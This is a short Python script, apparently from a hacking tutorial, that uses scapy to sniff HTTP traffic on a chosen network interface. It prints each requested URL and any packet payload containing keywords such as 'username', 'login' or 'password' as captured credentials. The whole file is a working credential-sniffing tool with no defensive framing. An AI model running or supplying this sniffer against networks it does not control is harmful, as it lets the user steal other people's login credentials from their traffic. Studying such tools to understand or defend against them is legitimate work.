#!/usr/bin/env python3

# pip install scapy
# pip install scapy-http

import scapy.all as scapy
from scapy.layers import http
import argparse

def get_arguments(): # Gets the specified interface to listen on
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Specify an interface to listen on. For example eth0 or wlan0.")
    (options) = parser.parse_args()
    if not options.interface:
        parser.error("[-] Please specify an interface to listen on.")
    return options

def sniffer(interface): #Listens on specified port
    print(f"[+] Listening on interface {interface}\n")
    scapy.sniff(iface=interface, store=False, prn=process_packet)

def get_url(packet): # Grabs URL
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_credentials(packet): # Gets credentials from packet
    if packet.haslayer(scapy.Raw):
            load = str(packet[scapy.Raw].load)
            keywords = ["username", "user", "uname", "login", "password", "pass"]
            for keyword in keywords:
                if keyword in load:
                    return load

def process_packet(packet): # Filters packet for http & outputs data to the terminal
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print(f"[+] HTTP Request >> {url}")
        credentials_packet = get_credentials(packet)
        if credentials_packet:
            print(f"\n\n[+] Credentials >> {credentials_packet}\n\n")

def main():
    options = get_arguments()
    sniffer(options.interface)

if __name__ == "__main__":
    main()